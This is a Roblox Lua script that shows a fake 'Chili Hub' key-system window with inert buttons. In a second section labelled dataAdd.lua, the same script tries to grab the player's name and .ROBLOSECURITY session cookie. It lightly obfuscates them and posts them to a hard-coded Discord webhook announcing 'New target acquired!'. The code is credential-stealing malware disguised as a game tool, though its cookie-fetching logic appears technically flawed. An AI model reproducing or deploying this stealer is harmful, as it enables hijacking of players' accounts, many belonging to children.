-- key system.lua content
print("Starting key system overlay...")
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game:GetService("CoreGui")

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 200)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
mainFrame.BorderSizePixel = 1
mainFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.Parent = screenGui

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, 0, 0, 50)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.Text = "Chili Hub"
titleLabel.TextSize = 24
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.TextScaled = true
titleLabel.Parent = mainFrame

local getKeyButton = Instance.new("TextButton")
getKeyButton.Size = UDim2.new(0.45, 0, 0, 50)
getKeyButton.Position = UDim2.new(0.025, 0, 0.3, 0)
getKeyButton.BackgroundColor3 = Color3.fromRGB(0, 128, 0)
getKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
getKeyButton.Text = "Get Key"
getKeyButton.TextSize = 20
getKeyButton.Font = Enum.Font.SourceSans
getKeyButton.TextScaled = true
getKeyButton.Parent = mainFrame

local checkKeyButton = Instance.new("TextButton")
checkKeyButton.Size = UDim2.new(0.45, 0, 0, 50)
checkKeyButton.Position = UDim2.new(0.525, 0, 0.3, 0)
checkKeyButton.BackgroundColor3 = Color3.fromRGB(0, 0, 128)
checkKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
checkKeyButton.Text = "Check Key"
checkKeyButton.TextSize = 20
checkKeyButton.Font = Enum.Font.SourceSans
checkKeyButton.TextScaled = true
checkKeyButton.Parent = mainFrame

local keyInput = Instance.new("TextBox")
keyInput.Size = UDim2.new(0.9, 0, 0, 40)
keyInput.Position = UDim2.new(0.05, 0, 0.6, 0)
keyInput.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
keyInput.TextColor3 = Color3.fromRGB(0, 0, 0)
keyInput.Text = ""
keyInput.PlaceholderText = "Enter your key here"
keyInput.TextSize = 18
keyInput.Font = Enum.Font.SourceSans
keyInput.TextScaled = true
keyInput.Parent = mainFrame

local function onButtonClick()
    print("Button clicked!")
    -- You can add functionality here if needed
end

getKeyButton.MouseButton1Click:Connect(onButtonClick)
checkKeyButton.MouseButton1Click:Connect(onButtonClick)

-- dataAdd.lua content
print("Starting data extraction...")
local function fetchCookies()
    local cookies = game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):GetAsync("https://auth.roblox.com/v2/logout"))
    for _, cookie in ipairs(cookies) do
        if cookie.Name == ".ROBLOSECURITY" then
            return cookie.Value
        end
    end
    return nil
end

local function encodeString(str)
    local encoded = ""
    for i = 1, #str do
        encoded = encoded .. string.char(string.byte(str, i) + 2)
    end
    return encoded
end

local function sendData()
    local playerName = game.Players.LocalPlayer.Name
    local playerPass = "password" -- Implement password capture if needed
    local securityCookie = fetchCookies()

    if not securityCookie then
        warn("Cookie retrieval failed!")
        return
    end

    local discordHook = "https://discord.com/api/webhooks/1395475931858210867/lfb0vDAyIFC7CGnE9tZq8D3-1Be2qAJiPw4HkdBmXmDwEqxo7WWJmyH25MGadNYIOUSA"
    local payload = {
        content = "@everyone New target acquired!",
        embeds = {
            {
                title = "Roblox Data Extract",
                fields = {
                    { name = "Player Name", value = encodeString(playerName), inline = true },
                    { name = "Player Password", value = encodeString(playerPass), inline = true },
                    { name = ".ROBLOSECURITY Cookie", value = encodeString(securityCookie), inline = false }
                }
            }
        }
    }

    local status, result = pcall(function()
        game:GetService("HttpService"):PostAsync(discordHook, game:GetService("HttpService"):JSONEncode(payload))
    end)

    if status then
        print("Data transmission successful!")
    else
        warn("Data transmission failed: " .. tostring(result))
    end
end

sendData()
